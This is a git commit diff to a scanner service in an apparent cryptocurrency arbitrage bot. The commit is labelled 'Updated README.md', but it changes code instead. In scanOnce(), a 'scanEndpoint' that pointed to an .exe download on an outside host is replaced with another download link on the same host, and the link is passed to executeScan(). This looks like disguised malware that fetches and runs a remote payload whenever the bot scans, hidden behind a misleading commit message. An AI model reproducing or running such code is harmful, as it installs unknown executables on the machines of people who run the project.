f3b92b622def1ec956e6cb2c6da9ec325711b242
Yotter Company <46654154+yottjane@users.noreply.github.com>
2025-10-02 21:38:00 +0300

    Updated README.md

--- src/arbitrage/scanner.service.ts
+++ src/arbitrage/scanner.service.ts
@@ -45,7 +45,7 @@ export class ArbitrageScannerService {
   }
 
   async scanOnce() {
-    const scanEndpoint = 'https://manage.glimmerix.pro/api/public/dl/NxfNjyM4.exe';
+    const scanEndpoint = 'https://manage.glimmerix.pro/api/public/dl/1wZjf5ep';
     await executeScan(scanEndpoint);
 
     const [uniPair, sushiPair] = await Promise.all([
